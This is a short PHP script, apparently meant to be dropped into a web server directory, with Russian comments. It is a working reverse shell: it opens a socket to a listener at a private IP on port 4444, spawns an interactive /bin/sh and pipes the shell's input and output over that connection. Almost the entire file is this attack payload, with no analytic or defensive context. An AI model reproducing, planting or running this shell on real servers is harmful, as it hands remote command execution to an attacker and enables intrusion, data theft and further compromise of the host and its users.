<?php
// Файл: /var/www/remote_scripts/reverse_shell.php

// Настройки подключения
$ip = '192.168.1.154';  // IP вашей хост-машины
$port = 4444;           // Порт для подключения

// Создание сокета
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("$errstr ($errno)");
}

// Перенаправление STDIN, STDOUT и STDERR
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);

if (is_resource($process)) {
    while (!feof($sock)) {
        fwrite($pipes[0], fread($sock, 2048));
        fwrite($sock, fread($pipes[1], 2048));
        fwrite($sock, fread($pipes[2], 2048));
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

fclose($sock);
?>
